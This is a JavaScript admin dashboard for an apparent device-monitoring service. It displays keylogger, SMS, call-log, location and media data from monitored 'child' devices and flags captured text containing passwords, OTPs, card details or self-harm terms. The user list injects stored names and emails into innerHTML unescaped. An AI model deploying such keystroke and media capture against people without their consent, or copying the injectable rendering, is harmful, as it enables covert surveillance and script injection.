import { initializeApp } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js";
import { getAuth, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-auth.js";
import { getDatabase, ref, onValue, remove, update, push, serverTimestamp, off, get } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js";
import { getStorage, ref as storageRef, deleteObject } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-storage.js";
import { getFunctions, httpsCallable } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-functions.js";
import { firebaseConfig } from './config.js';

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getDatabase(app);
const storage = getStorage(app);
const functions = getFunctions(app, 'asia-south1');

// === FIX #1: RED ALERT KEYWORDS ===
const DANGEROUS_KEYWORDS = [
    'OTP', 'Password', 'PIN', 'IMEI', 'UDID', 'Bank', 'Account', 'Card', 'CVV',
    'Credit', 'Debit', 'Transaction', 'Wire', 'Transfer', 'Money', 'Wallet',
    'Suicide', 'Kill', 'Death', 'Harm', 'Overdose', 'Pills', 'Rope', 'Gun',
    'Abuse', 'Rape', 'Violence', 'Drug', 'Cocaine', 'Heroin', 'Meth',
    'Secret', 'Hidden', 'Encrypted', 'Hack', 'Breach'
];

function checkForDangerousKeywords(text) {
    if (!text) return false;
    const lowerText = text.toLowerCase();
    return DANGEROUS_KEYWORDS.some(keyword => lowerText.includes(keyword.toLowerCase()));
}

// DOM Elements
const loginContainer = document.getElementById('login-container');
const dashboard = document.getElementById('dashboard');
const userList = document.getElementById('user-list');
const mainContentTitle = document.getElementById('main-content-title');
const detailsView = document.getElementById('details-view');
const categoryButtonsContainer = document.querySelector('.category-buttons');
const sidebar = document.querySelector('.sidebar');
const overlay = document.getElementById('overlay');
const dataModal = document.getElementById('data-modal');
const modalDataDisplayArea = document.getElementById('modal-data-display-area');
const notificationModal = document.getElementById('notification-modal');
const sendNotificationBtn = document.getElementById('send-notification-btn');
const sendToAllBtn = document.getElementById('send-to-all-btn');
const sendNotificationSubmitBtn = document.getElementById('send-notification-submit-btn');
const notificationMessageInput = document.getElementById('notification-message-input');
const menuBtn = document.getElementById('menu-btn');
const toggleSidebarBtn = document.getElementById('toggle-sidebar-btn');
const sidebarTitle = document.getElementById('sidebar-title');
const deleteUserBtn = document.getElementById('delete-user-btn');
const deleteUserModal = document.getElementById('delete-user-modal');
const confirmUserDeleteBtn = document.getElementById('confirm-user-delete-btn');
const cancelUserDeleteBtn = document.getElementById('cancel-user-delete-btn');
const deleteUserInfo = document.getElementById('delete-user-info');
const alertBellBtn = document.getElementById('alert-bell-btn');

// State
let activeDataListener = null;  // Tracks modal data listener (detached on modal close)
let selectedUserInfo = {};
let activeChatListeners = [];   // Array of {ref, callback} for sidebar chat indicators (one per user+device)
let isSendingToAll = false;

/**
 * CHAT LISTENER ARCHITECTURE:
 * 
 * 1. MAIN CHAT LISTENERS (Sidebar Indicators)
 *    - Attached in: loadUsersAndSetupChatListeners() - Line 395
 *    - Purpose: Show unread message indicators on sidebar user list
 *    - Storage: activeChatListeners array
 *    - Detach: detachChatIndicatorListeners() or detachAllListeners()
 * 
 * 2. MODAL CHAT LISTENER (Detailed Chat View)
 *    - Attached in: renderChat() - Line 953
 *    - Purpose: Display full chat history in modal when 'chat' category clicked
 *    - Storage: activeDataListener
 *    - Detach: Automatically when modal closes via closeModal()
 *    - Note: Previous activeDataListener is detached before attaching new one
 * 
 * FLOW:
 * 1. User loads → loadUsersAndSetupChatListeners() attaches sidebar indicator listeners
 * 2. User clicks 'chat' category → renderChat() attaches detailed chat listener
 * 3. Modal closes → closeModal() detaches detailed chat listener
 * 4. User changes → detachChatIndicatorListeners() clears all sidebar listeners, loads new ones
 * 5. User logs out → detachAllListeners() clears everything
 * 
 * KEY: No duplicate listeners on same path. Each user+device has ONE sidebar listener.
 */

let fullKeyloggerData = [];
let renderedKeyloggerCount = 0;
const KEYLOGGER_BATCH_SIZE = 50;
let isKeyloggerLoading = false;

// Admin Vault Batch Loading State
let fullVaultLogs = [];
let renderedVaultCount = 0;
const VAULT_BATCH_SIZE = 30;
let isVaultLoading = false;

// Alert Dashboard State
let criticalAlertsListener = null;

// --- Toast Notification System ---
function showToast(message, type = 'info', duration = 4000) {
    const container = document.getElementById('toast-container');
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.textContent = message;
    
    container.appendChild(toast);
    
    if (duration > 0) {
        setTimeout(() => {
            toast.classList.add('hide');
            setTimeout(() => toast.remove(), 300);
        }, duration);
    }
    
    return toast;
}

// --- Helper Functions ---

function detachAllListeners() {
    if (activeDataListener) {
        off(activeDataListener.ref, 'value', activeDataListener.callback);
        activeDataListener = null;
    }
    activeChatListeners.forEach(listener => {
        off(listener.ref, 'value', listener.callback);
    });
    activeChatListeners = [];
}

function detachChatIndicatorListeners() {
    activeChatListeners.forEach(listener => {
        off(listener.ref, 'value', listener.callback);
    });
    activeChatListeners = [];
}

function openModal(modalElement) {
    if (!modalElement) return;
    modalElement.style.display = 'flex';
    document.body.classList.add('modal-open');
}

function closeModal(modalElement) {
    if (!modalElement) return;
    if (modalElement.id === 'data-modal') {
        // Detach data listener
        if (activeDataListener) {
            off(activeDataListener.ref, 'value', activeDataListener.callback);
            activeDataListener = null;
        }
        
        // Remove scroll listeners
        modalDataDisplayArea.removeEventListener('scroll', handleKeyloggerScroll);
        modalDataDisplayArea.removeEventListener('scroll', handleVaultScroll);
        
        // Reset batch loading states
        fullKeyloggerData = [];
        renderedKeyloggerCount = 0;
        isKeyloggerLoading = false;
        
        fullVaultLogs = [];
        renderedVaultCount = 0;
        isVaultLoading = false;
    }
    modalElement.style.display = 'none';
    document.body.classList.remove('modal-open');
}

function formatTimestamp(timestamp) {
    if (!timestamp) return 'N/A';
    const date = new Date(timestamp);
    if (isNaN(date.getTime())) {
        return 'Invalid Date';
    }
    const options = {
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: true,
        timeZone: 'Asia/Kolkata'
    };
    return date.toLocaleString('en-IN', options);
}

function getCategoryPath(category, userId, childKey) {
    const paths = {
        'location': `user/${userId}/${childKey}/location/data`,
        'photo': `user/${userId}/${childKey}/photo/data`,
        'keylogger': `user/${userId}/${childKey}/keyLogger/data`,
        'sms': `user/${userId}/${childKey}/sms/data`,
        'notifications': `user/${userId}/${childKey}/adminNotifications/data`,
        'calllogs': `user/${userId}/${childKey}/Calls`,
        'devicestatus': `user/${userId}/${childKey}/DeviceStatus`,
        'video': `user/${userId}/${childKey}/video/data`,
        'audio': `user/${userId}/${childKey}/audio/data`,
        'health': `user/${userId}/${childKey}/AppHealthStatus`,
        // === STRICT COMMAND HISTORY PATH - SINGLE SOURCE OF TRUTH ===
        // ALL commands are ONLY written to: user/${userId}/${childKey}/CommandHistory
        // Legacy 'commands' path is DEPRECATED - DO NOT USE
        // Frontend reads from CommandHistory via getCategoryPath() helper
        'CommandHistory': `user/${userId}/${childKey}/CommandHistory`,
        // नई categories (New Backend)
        'admin-vault': `Admin_Vault/${userId}`,
        'critical-alerts': `Admin_Vault`,
        'freeze-status': `user/${userId}/profile_data/security`,
        'audit-logs': `system_audit_logs`,
        'limit-management': `user/${userId}/profile_data/limits`,
        'login-history': `user/${userId}/profile_data/login_history`
    };
    return paths[category] || `user/${userId}/${childKey}/${category}`;
}

/**
 * 🏥 LOG HEALTH EVENT - Write to per-child health_logs node
 * This function logs command execution and device events
 * @param {string} userId - Parent UID
 * @param {string} childKey - Child device key
 * @param {string} type - Event type (e.g., 'photo_command', 'photo_captured', 'video_command', 'video_recorded', 'audio_command', 'audio_recorded')
 * @param {string} commandName - Command name (photo, video, audio)
 * @param {string} status - Event status (requested, started, success, failed)
 * @param {object} details - Optional additional details (duration, file size, etc.)
 */
async function logHealthEvent(userId, childKey, type, commandName, status, details = {}) {
    try {
        const timestamp = Date.now();
        const healthLogsRef = ref(db, `user/${userId}/${childKey}/health_logs`);
        const newLogRef = push(healthLogsRef);
        
        await update(newLogRef, {
            type,
            commandName,
            status,
            timestamp,
            ...details
        });
    } catch (err) {
        console.error('Error logging health event:', err);
    }
}

/**
 * 📝 LOG LOGIN EVENT - Write to per-child logs_history node
 * This function logs admin panel access and session events
 * @param {string} userId - Parent UID
 * @param {string} childKey - Child device key
 * @param {string} eventType - Event type (login, logout, session_refresh)
 * @param {string} ip - IP address
 * @param {string} deviceType - Device type (mobile, desktop, tablet)
 * @param {string} browser - Browser name (Chrome, Safari, Edge, Firefox, etc.)
 */
async function logLoginEvent(userId, childKey, eventType, ip, deviceType, browser) {
    try {
        const timestamp = Date.now();
        const logsHistoryRef = ref(db, `user/${userId}/${childKey}/logs_history`);
        const newLogRef = push(logsHistoryRef);
        
        await update(newLogRef, {
            eventType,
            ip,
            deviceType,
            browser,
            timestamp
        });
    } catch (err) {
        console.error('Error logging login event:', err);
    }
}

/**
 * 🌍 LOG SYSTEM AUDIT - Write to global system_audit_logs node
 * This function logs global system events only (ghost deletions, admin actions)
 * @param {string} action - Action type (USER_FROZEN, COMMAND_BLOCKED, GHOST_DELETE, etc.)
 * @param {string} adminId - Admin user ID
 * @param {string} details - Action details
 * @param {string} targetUid - Target user ID (optional)
 */
async function logSystemAudit(action, adminId, details, targetUid = null) {
    try {
        const timestamp = Date.now();
        const auditRef = ref(db, 'system_audit_logs');
        const newLogRef = push(auditRef);
        
        const logData = {
            action,
            adminId,
            details,
            timestamp
        };
        
        if (targetUid) {
            logData.targetUid = targetUid;
        }
        
        await update(newLogRef, logData);
    } catch (err) {
        console.error('Error logging system audit:', err);
    }
}

/**
 * === BACKWARD COMPATIBILITY HELPER ===
 * SINGLE SOURCE OF TRUTH: Reads CommandHistory
 * 
 * This function ensures frontend only reads from CommandHistory (primary)
 * with optional fallback to legacy commands path for data migration
 * 
 * Returns: Combined command history data (from CommandHistory only in production)
 * 
 * @param {string} userId - User ID
 * @param {string} childKey - Child Key (device ID)
 * @returns {Promise} - Command history object { commandId: commandEntry }
 */
async function getCommandHistory(userId, childKey) {
    try {
        // === PRIMARY SOURCE: CommandHistory (NEW STANDARD) ===
        const commandHistoryRef = ref(db, `user/${userId}/${childKey}/CommandHistory`);
        const commandHistorySnapshot = await get(commandHistoryRef);
        const commandHistoryData = commandHistorySnapshot.val() || {};
        
        // === FALLBACK: Check legacy commands path (only if CommandHistory is empty) ===
        if (Object.keys(commandHistoryData).length === 0) {
            const legacyCommandsRef = ref(db, `user/${userId}/${childKey}/commands`);
            const legacySnapshot = await get(legacyCommandsRef);
            const legacyData = legacySnapshot.val() || {};
            
            if (Object.keys(legacyData).length > 0) {
                // Return legacy data for now, but log for migration
                return legacyData;
            }
        }
        
        return commandHistoryData;
    } catch (error) {
        return {};
    }
}

// --- Backend Function Stubs ---
// These functions will be called from the UI instead of direct database writes
// Cloud function wrappers are defined in detail below with audit logging

// Quick reference stubs - full implementations with logging are at the end of the file

// --- Auth & Main Listeners ---
document.getElementById('login-btn').addEventListener('click', () => {
    signInWithEmailAndPassword(auth, document.getElementById('email').value, document.getElementById('password').value)
        .catch(error => {
            document.getElementById('error-message').textContent = "Login Failed. Ensure you are an admin.";
        });
});

document.getElementById('logout-btn').addEventListener('click', () => {
    signOut(auth);
});

onAuthStateChanged(auth, user => {
    if (user) {
        const adminRef = ref(db, `admins/${user.uid}`);
        onValue(adminRef, (snapshot) => {
            if (snapshot.exists() && snapshot.val() === true) {
                loginContainer.style.display = 'none';
                dashboard.style.display = 'flex';
                loadUsersAndSetupChatListeners();
                setupCriticalAlertMonitoring();
            } else {
                signOut(auth);
                showToast('Access Denied. You are not an admin.', 'error');
            }
        }, { onlyOnce: true });
    } else {
        loginContainer.style.display = 'flex';
        dashboard.style.display = 'none';
        detachAllListeners();
    }
});

// --- Core Application Logic ---
// === PERFORMANCE: User List Search with Client-Side Filtering ===
let allUsersData = {}; // Store all users for quick search filtering

function filterAndRenderUsers(searchTerm = '') {
    const searchLower = searchTerm.toLowerCase().trim();
    const activeListItem = document.querySelector('.user-list-item.active');
    const activeUserId = activeListItem ? activeListItem.dataset.userid : null;
    
    userList.innerHTML = '';
    let matchCount = 0;
    
    if (!allUsersData || Object.keys(allUsersData).length === 0) {
        userList.innerHTML = `
            <li style="padding: 2rem; text-align: center; color: #8b949e; list-style: none;">
                <div style="font-size: 2rem; margin-bottom: 0.5rem;">👥</div>
                <p style="margin: 0; font-weight: 500;">No Users Found</p>
                <p style="margin: 0.5rem 0 0 0; font-size: 0.9rem;">No monitored users available yet.</p>
            </li>
        `;
        return;
    }
    
    Object.keys(allUsersData).forEach(userId => {
        const userProfile = allUsersData[userId];
        
        // Skip if not a user object
        if (!userProfile || typeof userProfile !== 'object' || !userProfile.email) {
            return;
        }
        
        // Apply search filter
        const email = userProfile.email || '';
        const name = userProfile.name || '';
        const matchesSearch = !searchLower || 
                             email.toLowerCase().includes(searchLower) || 
                             name.toLowerCase().includes(searchLower) ||
                             userId.toLowerCase().includes(searchLower);
        
        if (!matchesSearch) return;
        
        matchCount++;
        const isVerified = userProfile.emailVerified !== false;
        const hasGhostWarning = userProfile.deletion_warning_sent === true;
        const ghostIcon = hasGhostWarning ? '👻' : '';
        
        let verificationIconHTML = '';
        if (isVerified) {
            verificationIconHTML = `<span class="verification-status verified" title="Email Verified">&#10004;</span>`;
        } else {
            verificationIconHTML = `<span class="verification-status not-verified" title="Email Not Verified">&#33;</span>`;
        }
        
        const accountType = userProfile.account_type || 'free';
        const planBadgeColor = accountType === 'pro' ? '#26d07c' : accountType === 'enterprise' ? '#ffd700' : '#6e7681';
        const planBadgeText = accountType.charAt(0).toUpperCase() + accountType.slice(1);
        
        const listItem = document.createElement('li');
        listItem.className = 'user-list-item';
        listItem.dataset.userid = userId;
        listItem.innerHTML = `
            ${verificationIconHTML}
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
            <div>
                <div class="user-name">${ghostIcon} ${email || name || userId} <span style="display: inline-block; background: ${planBadgeColor}; color: ${accountType === 'enterprise' ? '#000' : '#fff'}; padding: 2px 8px; border-radius: 12px; font-size: 0.75rem; font-weight: 600; margin-left: 8px;">${planBadgeText}</span></div>
                <div class="device-name">${name || 'User'}</div>
                <div class="user-id">ID: ${userId}</div>
            </div>`;
        
        if (hasGhostWarning) {
            listItem.style.opacity = '0.7';
            listItem.title = 'Account scheduled for deletion';
        }
        
        if (userId === activeUserId) {
            listItem.classList.add('active');
        }
        
        userList.appendChild(listItem);
    });
    
    if (matchCount === 0 && searchTerm) {
        userList.innerHTML = `
            <li style="padding: 2rem; text-align: center; color: #8b949e; list-style: none;">
                <div style="font-size: 2rem; margin-bottom: 0.5rem;">🔍</div>
                <p style="margin: 0; font-weight: 500;">No matches found</p>
                <p style="margin: 0.5rem 0 0 0; font-size: 0.9rem;">Try different search term.</p>
            </li>
        `;
    }
    
    const visibleCount = matchCount || Object.keys(allUsersData).filter(uid => {
        return allUsersData[uid] && allUsersData[uid].email;
    }).length;
    sidebarTitle.textContent = searchTerm ? `Results (${matchCount})` : `Users (${visibleCount})`;
}

// === FIX #2: SIDEBAR DATA SOURCE OPTIMIZATION ===
function loadUsersAndSetupChatListeners() {
    // Load from lightweight User_List instead of heavy user node
    const userListRef = ref(db, 'User_List');
    
    onValue(userListRef, (snapshot) => {
        detachChatIndicatorListeners();
        
        const data = snapshot.val();
        allUsersData = data || {};
        filterAndRenderUsers();
    });
}

userList.addEventListener('click', (e) => {
    const listItem = e.target.closest('.user-list-item');
    if (listItem) {
        document.querySelectorAll('.user-list-item.active').forEach(item => item.classList.remove('active'));
        listItem.classList.add('active');
        
        const userId = listItem.dataset.userid;
        const userName = listItem.querySelector('.user-name').textContent.replace(/👻\s/, '');
        
        // === STEP 1: IMMEDIATELY UPDATE selectedUserInfo ===
        // This ensures we capture the clicked user BEFORE any async operations
        selectedUserInfo = {
            userId: userId,
            childKey: null,
            userName: userName
        };
        
        // === UPDATE UI IMMEDIATELY ===
        mainContentTitle.textContent = userName;
        detailsView.style.display = 'block';
        quickActionsBar.style.display = 'flex';
        sendNotificationBtn.style.display = 'inline-flex';
        deleteUserBtn.style.display = 'inline-flex';
        
        // === STEP 2: FETCH FIREBASE DATA TO GET DEVICE DETAILS ===
        const userRef = ref(db, `user/${userId}`);
        get(userRef).then((snapshot) => {
            if (snapshot.exists()) {
                const userData = snapshot.val();
                
                // === FIX #1: IMPROVED CHILD KEY DETECTION ===
                // Find first child key that is a valid device node (not profile_data, profile, commands, etc.)
                let childKey = null;
                let validChildData = null;
                
                for (const key in userData) {
                    // Skip non-device keys
                    if (['profile', 'profile_data', 'commands', 'Admin_Vault'].includes(key)) {
                        continue;
                    }
                    
                    // Check if this is a valid device node
                    const nodeData = userData[key];
                    if (nodeData && typeof nodeData === 'object') {
                        // Valid device node should have 'data' property or 'AppHealthStatus'
                        if (nodeData.data || nodeData.AppHealthStatus) {
                            childKey = key;
                            validChildData = nodeData;
                            break;
                        }
                    }
                }
                
                // === STEP 3: IF DEVICE DATA FOUND, UPDATE selectedUserInfo WITH MORE DETAILS ===
                if (childKey && validChildData) {
                    // === FIX #2: READ REAL CHILD AND DEVICE NAMES ===
                    let childName = 'Unknown Child';
                    let deviceName = 'Unknown Device';
                    
                    // Try to get names from data object
                    if (validChildData.data && typeof validChildData.data === 'object') {
                        childName = validChildData.data.nameChild || 'Child Device';
                        deviceName = validChildData.data.nameDevice || 'Device';
                    }
                    
                    // Fallback: use childKey and userId if names not found
                    if (childName === 'Child Device') {
                        childName = `Device ${childKey}`;
                    }
                    
                    const displayName = `${childName} (${deviceName})`;
                    
                    // Update selectedUserInfo with device details
                    selectedUserInfo = { 
                        userId: userId, 
                        childKey: childKey,
                        userName: displayName,
                        childName: childName,
                        deviceName: deviceName
                    };
                    
                    // Update UI with device-specific information
                    mainContentTitle.textContent = displayName;
                    
                    // Setup chat listener for this user and device
                    const chatRef = ref(db, `chats/${userId}/${childKey}/messages`);
                    const chatCallback = (chatSnapshot) => {
                        if (!chatSnapshot.exists()) return;

                        const messages = chatSnapshot.val();
                        let lastUserTimestamp = 0;
                        let lastAdminTimestamp = 0;

                        Object.values(messages).forEach(msg => {
                            if (msg.sender === 'user' && typeof msg.timestamp === 'number') {
                                lastUserTimestamp = Math.max(lastUserTimestamp, msg.timestamp);
                            } else if (msg.sender === 'admin' && typeof msg.timestamp === 'number') {
                                lastAdminTimestamp = Math.max(lastAdminTimestamp, msg.timestamp);
                            }
                        });

                        const mainChatButton = document.querySelector('.category-btn[data-category="chat"]');
                        const existingMainIndicator = mainChatButton?.querySelector('.chat-notification-indicator');
                        if (existingMainIndicator) existingMainIndicator.remove();
                        
                        const indicator = listItem.querySelector('.sidebar-indicator');
                        if (lastUserTimestamp > lastAdminTimestamp) {
                            if (!indicator) {
                                const newIndicator = document.createElement('div');
                                newIndicator.className = 'sidebar-indicator';
                                listItem.appendChild(newIndicator);
                            }
                            
                            if (mainChatButton) {
                                const newMainIndicator = document.createElement('div');
                                newMainIndicator.className = 'chat-notification-indicator';
                                mainChatButton.appendChild(newMainIndicator);
                            }
                        } else {
                            if (indicator) indicator.remove();
                        }
                    };

                    onValue(chatRef, chatCallback);
                    activeChatListeners.push({ ref: chatRef, callback: chatCallback });
                }
                // === STEP 4: IF NO DEVICE DATA FOUND, KEEP selectedUserInfo FROM STEP 1 ===
                // (selectedUserInfo already set with userId, userName, childKey: null)

                if (window.innerWidth <= 992) {
                    sidebar.classList.remove('open');
                    overlay.style.display = 'none';
                }
            }
            // === STEP 4: IF SNAPSHOT DOESN'T EXIST (GHOST ACCOUNT), KEEP selectedUserInfo FROM STEP 1 ===
        }).catch((error) => {
            // === ERROR OCCURRED FETCHING DATA, KEEP selectedUserInfo FROM STEP 1 ===
            // (selectedUserInfo already set with userId, userName, childKey: null)
            // This allows us to still delete ghost accounts
            console.error('Error fetching user data:', error);
            
            if (window.innerWidth <= 992) {
                sidebar.classList.remove('open');
                overlay.style.display = 'none';
            }
        });
    }
});

function resetDashboardView() {
    mainContentTitle.textContent = 'Select a User';
    detailsView.style.display = 'none';
    quickActionsBar.style.display = 'none';
    sendNotificationBtn.style.display = 'none';
    deleteUserBtn.style.display = 'none';
    selectedUserInfo = {};
    document.querySelectorAll('.user-list-item.active').forEach(item => item.classList.remove('active'));
}

deleteUserBtn.addEventListener('click', () => {
    if (selectedUserInfo.userId && selectedUserInfo.userName) {
        deleteUserInfo.textContent = `Are you sure you want to delete all data for the user '${selectedUserInfo.userName}' (ID: ${selectedUserInfo.userId})?`;
        openModal(deleteUserModal);
    } else {
        showToast('Please select a user first.', 'warning');
    }
});

cancelUserDeleteBtn.addEventListener('click', () => {
    closeModal(deleteUserModal);
});

confirmUserDeleteBtn.addEventListener('click', async () => {
    const { userId, userName } = selectedUserInfo;
    if (userId) {
        try {
            await manualGhostDelete(userId);
            showToast(`👻 User '${userName}' (${userId}) has been marked for deletion.`, 'success');
            closeModal(deleteUserModal);
            
            // Refresh user list after deletion
            setTimeout(() => {
                loadUsersAndSetupChatListeners();
                resetDashboardView();
            }, 1500);
        } catch (error) {

            // Toast is already shown in manualGhostDelete function
            closeModal(deleteUserModal);
        }
    } else {
        showToast('❌ User information not available.', 'error');
    }
});



categoryButtonsContainer.addEventListener('click', (e) => {
    const button = e.target.closest('.category-btn');
    if (button) {
        openModal(dataModal);
        displayCategoryData(button.dataset.category);
    }
});

toggleSidebarBtn.addEventListener('click', () => dashboard.classList.toggle('sidebar-hidden'));

menuBtn.addEventListener('click', () => {
    sidebar.classList.add('open');
    overlay.style.display = 'block';
});

overlay.addEventListener('click', (e) => {
    if(e.target === overlay) {
        sidebar.classList.remove('open');
        overlay.style.display = 'none';
    }
});

document.querySelectorAll('.modal-close-btn').forEach(btn => {
    btn.addEventListener('click', e => closeModal(e.target.closest('.modal-overlay')));
});

document.querySelectorAll('.modal-overlay').forEach(modal => {
    modal.addEventListener('click', e => {
        if(e.target === modal) closeModal(modal);
    });
});

sendNotificationBtn.addEventListener('click', () => {
    if (selectedUserInfo.userId) {
        isSendingToAll = false;
        document.getElementById('notification-modal-title').textContent = `Send Notification to ${selectedUserInfo.userName}`;
        notificationMessageInput.value = '';
        openModal(notificationModal);
    } else { showToast('Please select a user first.', 'warning'); }
});

sendToAllBtn.addEventListener('click', () => {
    isSendingToAll = true;
    document.getElementById('notification-modal-title').textContent = 'Send Notification to All Users';
    notificationMessageInput.value = '';
    openModal(notificationModal);
});

sendNotificationSubmitBtn.addEventListener('click', () => {
    const message = notificationMessageInput.value.trim();
    if (!message) {
        showToast('Message cannot be empty.', 'warning');
        return;
    }

    if (isSendingToAll) {
        showToast('Sending notification to all users...', 'info', 0);
        const usersRef = ref(db, 'user');
        onValue(usersRef, (snapshot) => {
            if (snapshot.exists()) {
                const usersData = snapshot.val();
                const updates = {};
                const notificationPayload = {
                    message: message,
                    timestamp: serverTimestamp(),
                    read: false
                };

                Object.keys(usersData).forEach(userId => {
                    Object.keys(usersData[userId]).forEach(childKey => {
                         if (childKey === 'profile' || childKey === 'profile_data') return;
                        const newNotificationKey = push(ref(db, `user/${userId}/${childKey}/adminNotifications`)).key;
                        updates[`user/${userId}/${childKey}/adminNotifications/${newNotificationKey}`] = notificationPayload;
                    });
                });

                update(ref(db), updates)
                    .then(() => {
                        showToast('Notification sent to all users successfully!', 'success');
                        closeModal(notificationModal);
                    })
                    .catch(error => {
                        showToast('Failed: ' + error.message, 'error');
                    });
            } else {
                showToast('No users found.', 'warning');
            }
        }, { onlyOnce: true });
    } else {
        if (selectedUserInfo.userId && selectedUserInfo.childKey) {
            push(ref(db, `user/${selectedUserInfo.userId}/${selectedUserInfo.childKey}/adminNotifications`), { message: message, timestamp: serverTimestamp(), read: false })
                .then(() => {
                    showToast('Notification sent successfully!', 'success');
                    closeModal(notificationModal);
                })
                .catch(error => {
                    showToast('Failed to send notification: ' + error.message, 'error');
                });
        } else {
            showToast('No user selected.', 'warning');
        }
    }
});

// --- Modal Event Handlers ---

// Media Limits Modal
const mediaLimitsModal = document.getElementById('media-limits-modal');
const updateLimitsBtn = document.getElementById('update-limits-btn');

// Delete Device Modal
const deleteDeviceModal = document.getElementById('delete-device-modal');
const cancelDeviceDeleteBtn = document.getElementById('cancel-device-delete-btn');
const confirmDeviceDeleteBtn = document.getElementById('confirm-device-delete-btn');
const deleteDeviceInfo = document.getElementById('delete-device-info');

let deviceToDelete = { userId: null, childKey: null, deviceName: null };

// Change Plan Modal
const changePlanModal = document.getElementById('change-plan-modal');
const changePlanBtn = document.getElementById('change-plan-btn');
const planSelect = document.getElementById('plan-select');

changePlanBtn?.addEventListener('click', async () => {
    const plan = planSelect.value;

    if (!plan) {
        showToast('Please select a plan.', 'warning');
        return;
    }

    if (!selectedUserInfo.userId) {
        showToast('Please select a user first.', 'warning');
        return;
    }

    try {
        await changeUserPlan(selectedUserInfo.userId, plan);
        showToast(`User plan changed to '${plan}' successfully!`, 'success');
        closeModal(changePlanModal);
    } catch (error) {
        // Error is handled by the changeUserPlan function
    }
});

// Device and Chat Event Listeners
cancelDeviceDeleteBtn?.addEventListener('click', () => {
    closeModal(deleteDeviceModal);
});

confirmDeviceDeleteBtn?.addEventListener('click', async () => {
    if (deviceToDelete.userId && deviceToDelete.childKey) {
        try {
            await deleteChildDevice(deviceToDelete.userId, deviceToDelete.childKey);
            showToast(`Device '${deviceToDelete.deviceName}' has been deleted.`, 'success');
            closeModal(deleteDeviceModal);
            // Refresh the current view
            userList.click();
        } catch (error) {
            // Error is handled by the deleteChildDevice function
        }
    }
});

updateLimitsBtn?.addEventListener('click', async () => {
    const photoLimit = parseInt(document.getElementById('photo-limit-input').value) || 0;
    const videoLimit = parseInt(document.getElementById('video-limit-input').value) || 0;
    const audioLimit = parseInt(document.getElementById('audio-limit-input').value) || 0;

    if (!selectedUserInfo.userId) {
        showToast('Please select a user first.', 'warning');
        return;
    }

    try {
        await updateUserLimits(selectedUserInfo.userId, {
            photoLimit,
            videoLimit,
            audioLimit
        });
        showToast('Media limits updated successfully!', 'success');
        closeModal(mediaLimitsModal);
    } catch (error) {
        // Error is handled by the updateUserLimits function
    }
});

// Quick Actions Bar
const quickActionsBar = document.getElementById('quick-actions-bar');
const openMediaLimitsBtn = document.getElementById('open-media-limits-btn');
const openChangePlanBtn = document.getElementById('open-change-plan-btn');
const openDeleteDeviceBtn = document.getElementById('open-delete-device-btn');
const openClearChatBtn = document.getElementById('open-clear-chat-btn');

openMediaLimitsBtn?.addEventListener('click', () => {
    if (selectedUserInfo.userId) {
        // Load current limits into the form from profile_data/limits
        const limitsRef = ref(db, `user/${selectedUserInfo.userId}/profile_data/limits`);
        get(limitsRef).then((snapshot) => {
            const limitsData = snapshot.val() || {};
            const photosData = limitsData.photos || {};
            const videosData = limitsData.videos || {};
            const audioData = limitsData.audio || {};
            
            document.getElementById('photo-limit-input').value = photosData.max || 5;
            document.getElementById('video-limit-input').value = videosData.max || 4;
            document.getElementById('audio-limit-input').value = audioData.max || 5;
            openModal(mediaLimitsModal);
        }).catch(err => {

            showToast('❌ Failed to load current limits', 'error');
        });
    } else {
        showToast('⚠️ Please select a user first.', 'warning');
    }
});

openChangePlanBtn?.addEventListener('click', () => {
    if (selectedUserInfo.userId) {
        planSelect.value = '';
        openModal(changePlanModal);
    }
});

openDeleteDeviceBtn?.addEventListener('click', () => {
    if (selectedUserInfo.userId && selectedUserInfo.childKey) {
        const confirmed = window.confirm('Are you sure you want to PERMANENTLY delete this device? This cannot be undone.');
        if (confirmed) {
            deleteChildDevice(selectedUserInfo.userId, selectedUserInfo.childKey);
        }
    } else {
        showToast('Please select a user and device first.', 'warning');
    }
});

openClearChatBtn?.addEventListener('click', async () => {
    if (selectedUserInfo.userId && selectedUserInfo.childKey) {
        const confirmed = window.confirm('Are you sure you want to clear the chat history for this specific device?');
        if (confirmed) {
            await clearUserChat(selectedUserInfo.userId, selectedUserInfo.childKey);
        }
    } else {
        showToast('Please select a user and device first.', 'warning');
    }
});

// --- Data Rendering Functions ---

function displayCategoryData(category) {
    document.querySelectorAll('.category-btn').forEach(btn => btn.classList.remove('active'));
    const currentBtn = document.querySelector(`.category-btn[data-category="${category}"]`);
    if (currentBtn) currentBtn.classList.add('active');
    
    detachAllListeners();
    
    modalDataDisplayArea.innerHTML = '<div class="loader"></div>';
    
    const { userId, childKey } = selectedUserInfo;
    if (!userId || !childKey) {
        modalDataDisplayArea.innerHTML = '<p>Please select a user first.</p>';
        return;
    }
    
    document.getElementById('modal-title').textContent = `${category.charAt(0).toUpperCase() + category.slice(1)} Data`;
    
    // पुरानी categories (Old Backend Features)
    if (category === 'photo') { renderPhotosFromDatabase(userId, childKey); return; }
    if (category === 'video') { renderVideosFromDatabase(userId, childKey); return; }
    if (category === 'audio') { renderAudiosFromDatabase(userId, childKey); return; }
    if (category === 'chat') { renderChat(userId, childKey); return; }
    
    if (category === 'health') {
        // Read from per-child health_logs node (only command and device events)
        const healthLogsRef = ref(db, `user/${userId}/${childKey}/health_logs`);

        const callback = (snapshot) => {
            renderHealthLogs(snapshot.val());
        };
        
        onValue(healthLogsRef, callback);
        activeDataListener = { ref: healthLogsRef, callback: callback };
        return; 
    }
    
    // नई categories (New Backend Features)
    if (category === 'admin-vault') { 
        displayAdminVault(userId); 
        return; 
    }
    if (category === 'critical-alerts') { 
        displayCriticalAlerts(); 
        return; 
    }
